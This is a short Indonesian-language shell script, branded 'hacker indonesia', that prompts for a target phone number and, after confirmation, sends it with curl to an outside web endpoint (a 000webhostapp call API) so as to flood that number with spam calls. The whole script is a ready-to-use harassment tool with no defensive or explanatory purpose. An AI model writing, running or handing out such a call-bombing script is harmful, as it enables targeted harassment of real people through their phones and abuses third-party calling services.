#!/bin/sh
#hacker indonesia

echo Selamat datang kak, Siapa nick kaka? #tulisan keluar

read nick #membaca yang ditulis
echo "================================================="
echo "== ╦ ╦┌─┐┌─┐┬┌─┌─┐┬─┐  ┬┌┐┌┌┬┐┌─┐┌┐┌┌─┐┌─┐┬┌─┐ =="
echo "== ╠═╣├─┤│  ├┴┐├┤ ├┬┘  ││││ │││ ││││├┤ └─┐│├─┤ =="
echo "== ╩ ╩┴ ┴└─┘┴ ┴└─┘┴└─  ┴┘└┘─┴┘└─┘┘└┘└─┘└─┘┴┴ ┴ =="
echo "================================================="
echo selamat datang $nick ":)"
echo
echo "Silahkan masukan nomor telp target"
echo contoh 0812345678
read target # masukin no telp

echo
echo Apakah nomor $target "sudah benar?"
echo y/n?
read confirm
echo
if [ $confirm = "y" ]; then
echo Melakukan spam call ke nomor $target
target_do='http://zpro.000webhostapp.com/api/call.php?nomor='$target
CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
#echo $target_do
else
echo Kesalahan, silahkan coba lagi
fi

